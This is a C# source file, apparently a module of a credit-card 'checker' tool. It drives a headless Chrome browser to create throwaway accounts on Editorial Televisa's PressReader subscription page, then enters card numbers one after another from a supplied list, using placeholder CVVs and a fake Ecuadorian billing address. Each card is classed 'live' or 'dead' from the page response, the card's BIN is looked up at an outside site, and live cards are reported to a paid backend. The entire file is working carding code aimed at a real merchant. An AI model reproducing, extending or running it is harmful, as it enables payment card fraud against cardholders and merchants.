using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Televisa
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private void GetEmail()
        {


            //###--obtener email--#####
            ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
            driver.SwitchTo().Window(driver.WindowHandles.Last());
            Thread.Sleep(300);
            driver.Url = "https://www.abandonmail.com/es";
            Thread.Sleep(5000);

            if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
            {
                driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
            {
                correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            Thread.Sleep(3000);

            driver.SwitchTo().Window(driver.WindowHandles.First());



        }


        public void load()
        {
            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "4")
            {

                try
                {
                    Thunder._Form1.update_progresbar(5);
                    var chromeOptions = new ChromeOptions();
                    //correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });"--headless"
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors", "--headless"); //"--proxy-server=http://p.webshare.io:9999",

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;

                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://editorialtelevisa.pressreader.com/accounting/signup/?returnUrl=/Accounting/UpgradeSubscription";
                    ////Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@hotmail.com";
                    Thread.Sleep(2000);
                    //Process.Start("proxy.exe");
                    Thread.Sleep(2000);


                    if (tiempoElemento(By.Id("Contract_EmailAddress")))
                    {
                        Thunder._Form1.update_progresbar(10);
                        enviarTexto(By.Id("Contract_EmailAddress"), correo);
                        enviarTexto(By.Id("Contract_Password"), clave);
                        enviarTexto(By.Id("Contract_ConfirmPassword"), clave);
                        enviarTexto(By.Id("Contract_FirstName"), "JOSE");
                        enviarTexto(By.Id("Contract_LastName"), "REYES");
                        driver.FindElementByXPath("/html/body/div/div/div[2]/div/section/section/form/fieldset/p[2]/label/button").Click();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='bundleElm']/div[2]/div/div[2]/div[2]/ul/li[4]")))
                        {
                            driver.FindElementByXPath("//*[@id='bundleElm']/div[2]/div/div[2]/div[2]/ul/li[4]").Click();
                            Thread.Sleep(1000);
                            if (tiempoElemento(By.XPath("//*[@id='bundleElm']/div[2]/div/div[2]/div[3]/div[4]/div[2]/ul/li[1]/div[1]/div[2]")))
                            {
                                driver.FindElement(By.XPath("//*[@id='bundleElm']/div[2]/div/div[2]/div[3]/div[4]/div[2]/ul/li[1]/div[1]/div[2]")).Click();
                                Thread.Sleep(1000);
                                driver.FindElement(By.XPath("//*[@id='bundleElm']/div[4]/div/div/div[2]/label[1]/button")).Click();
                                Thread.Sleep(1000);

                                if (tiempoElemento(By.Id("BillingInfo_CardholderName")))
                                {
                                    pago();
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }


                }
                catch (Exception ex)
                {

                    if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "4")
                    {
                        restart();
                    }
                }


            }
        }

        private void enviarTexto(By by, string texto)
        {
            driver.FindElement(by).SendKeys(texto);
        }

        private void clickElemento(By by)
        {
            driver.FindElement(by).Click();
        }

        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {

            Thunder._Form1.update_progresbar(0);

            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "4")
            {



                try
                {
                    pagos = 0;

                    driver.Close();
                    driver.Quit();
                    load();
                }
                catch (Exception)
                {
                    pagos = 0;
                    driver.Quit();
                    load();
                }
            }

        }

        private void pago()
        {
            try
            {


                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "4")
                {
                    if (pagos < 3)
                    {
                        Thunder._Form1.update_progresbar(90);
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var mes = ccLine[1];
                        var anio = ccLine[2];


                        if (IsElementPresent(By.Id("BillingInfo_CardholderName")))
                        {
                            if (pagos == 0)
                            {
                                enviarTexto(By.Id("BillingInfo_CardholderName"), "JOSE REYES");
                            }
                            
                            Thread.Sleep(100);
                            enviarTexto(By.Id("BillingInfo_CardNumber"), ccnum); 
                            Thread.Sleep(100);
                            var selectMes = new SelectElement(driver.FindElementById("BillingInfo_ExpirationMonth"));
                            Thread.Sleep(100);
                            selectMes.SelectByText(mes);
                            Thread.Sleep(100);
                            var selectAnio = new SelectElement(driver.FindElementById("BillingInfo_ExpirationYear"));
                            Thread.Sleep(100);
                            selectAnio.SelectByText(anio);

                    

                        

                            if (ccLine[3].Length == 3)
                            {
                                driver.FindElementById("BillingInfo_CVVCode").SendKeys("000");
                                Thread.Sleep(100);
                            }
                            else
                            {
                                driver.FindElementById("BillingInfo_CVVCode").SendKeys("0000");
                                Thread.Sleep(100);

                            }

                          

                            Thread.Sleep(1000);

                            if (pagos == 0)
                            {
                                var selectPais= new SelectElement(driver.FindElementById("BillingInfo_CountryCode"));
                                Thread.Sleep(100);
                                selectPais.SelectByValue("EC");
                                enviarTexto(By.Id("BillingInfo_AddressLine1"), "AMBATO MALL DE LOS ANDES "); ;
                                Thread.Sleep(100);
                                enviarTexto(By.Id("BillingInfo_AddressLine1"), "AMBATO"); ;
                                Thread.Sleep(100);
                                enviarTexto(By.Id("BillingInfo_City"), "AMBATO"); ;
                                Thread.Sleep(100);
                                enviarTexto(By.Id("BillingInfo_ProvinceCode"), "TUNGURAHUA"); ;
                                Thread.Sleep(100);
                                enviarTexto(By.Id("BillingInfo_PostalCode"), "180101"); ;
                                Thread.Sleep(100);
                            }

                            driver.FindElementByXPath("/html/body/div/div/div[2]/div/form/section/fieldset[3]/p[3]/label[1]/button").Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.XPath("/html/body/div/div/div[2]/div/form/section/div[5]/p[2]/label[1]"))){
                                driver.FindElementByXPath("/html/body/div/div/div[2]/div/form/section/div[5]/p[2]/label[1]").Click();
                                Thread.Sleep(2000);
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }



                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = "";
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "4")
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;



            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("/html/body/div/div/div[2]/div/form/section/div[2]/div/ul/li")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div/div/div[2]/div/form/section/div[2]/div/ul/li")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div/div/div[2]/div/form/section/div[2]/div/ul/li")).Text.Trim() !="")
                            {
                                
                                estado = "dead";
                            }
                            
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div/div/div[2]/div/form/section[1]/header/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div/div/div[2]/div/form/section[1]/header/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div/div/div[2]/div/form/section[1]/header/h1")).Text.Trim() == "Gracias")
                            {
                                estado = "live";
                            }
                        }
                    }

                   



                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                if (tiempoElemento(By.XPath("/html/body/div/div/div[2]/div/form/section/div[1]/ol/li[2]/a")))
                {
                    driver.FindElementByXPath("/html/body/div/div/div[2]/div/form/section/div[1]/ol/li[2]/a").Click();
                    Thread.Sleep(1000);

                    if (tiempoElemento(By.Id("BillingInfo_CardNumber")))
                    {
                        driver.ExecuteScript("document.querySelector('#BillingInfo_CardNumber').value=''");
                        Thread.Sleep(1000);
                        return false;
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    restart();
                }
                
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();
            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;
            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;
            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}



